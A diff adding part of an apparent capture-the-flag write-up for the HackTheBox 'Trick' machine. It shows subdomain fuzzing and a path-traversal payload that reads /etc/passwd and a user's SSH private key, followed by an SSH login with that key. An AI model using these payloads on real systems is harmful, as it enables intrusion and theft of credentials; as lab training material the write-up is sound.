@@ -117,4 +117,107 @@ Burp was launch immediately and I rewrote the authentication probe response to `
 
 Putting these steps into auto-replace rules worked like a charm, however it was pointless. I was able to access and use the restricted pages, but it was a rabit hole.
 
+Let's try to find subdomains:
 
+`dnsrecon -D subdomains.txt -d trick.htb -t brt`
+
+`python3 dnscan.py -d trick.htb. -w subdomains.txt -q -v`
+
+None of them worked and here comes the trick. Approching the enumeration with another technique, you can use HTTP requests to identify subdomains. Plus one more important thing. It is always worth to use the prefixes during the domain name enum. For exmaple:
+
+- dev
+- uat
+- int
+- stage
+- preprod
+- prod
+
+Here I kept the `preprod-` prefix and chose the proper tool for this job:
+
+`wfuzz -c -w subdomains-10000.txt -u http://10.10.11.166 -H 'Host: preprod-FUZZ.trick.htb' --hh 5480`
+
+With the `-H` switch we can add HTTP header to the requests. The `FUZZ` keyword is the placeholder and wfuzz will replace this keyword with the actual word provided in the wordlist.
+
+`--hh` - hide responses with the specified chars. 
+
+The 5480 is the character number of the error page when we use unkown host. During the scanning process wfuzz is spanning the output, therefore it is recommended to filter these findings. So the output look liked this:
+
+```
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.166/
+Total requests: 9985
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                    
+=====================================================================
+
+000000244:   200        178 L    631 W      9660 Ch     "marketing"                                                                                                                                                
+000003734:   302        266 L    527 W      9546 Ch     "payroll"                                                                                                                                                  
+
+Total time: 57.82799
+Processed Requests: 9985
+Filtered Requests: 9983
+Requests/sec.: 172.6672
+```
+
+Another one! By adding `preprod-marketing.htb` to the `hosts` file it unlocked a new web application. Another one!
+Navigating through the application, a suspicious attack surface could be noticed in the browser bar:
+
+`http://preprod-marketing.trick.htb/index.php?page=about.html`
+
+
+The `page` parameter might be a good surface. Since it is a PHP application, there is a little chance to LFI or RFI. Basic payloads did not work, we need something heavier here:
+
+`dotdotpwn -m http-url -u http://preprod-marketing.trick.htb/index.php?page=TRAVERSAL -M GET -k root`
+
+The method is pretty same as the previous one. Keyword subtitution and response comparison.
+
+```
+[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd <- VULNERABLE
+[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/issue
+[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././etc/passwd <- VULNERABLE
+[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././etc/issue
+[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././etc/passwd <- VULNERABLE
+[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././etc/issue
+[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././etc/passwd <- VULNERABLE
+[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././etc/issue
+```
+
+Keeping eye on the results the users could be retrieved and one user seemed to be interesting:
+
+`michael:x:1001:1001::/home/michael:/bin/bash`
+
+[Wait a minute](https://youtu.be/cw9FIeHbdB8?t=5)🧐, the host using SSH.
+
+It's time to figure out whether _michael_ has SSH access to the box.
+
+`http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa`
+
+Aaand he has: 👍🏾
+
+```
+#### micheal's key
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+...
+IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Dump the key into a file and SSH to the server:
+
+`ssh -vvv michael@10.10.11.116 -i privkey`
+
+We got User privilege on the box:
+
+```
+michael@trick:~$ id
+uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
+michael@trick:~$ uname -a
+Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/Linux
+michael@trick:~$ hostname
+trick
+```
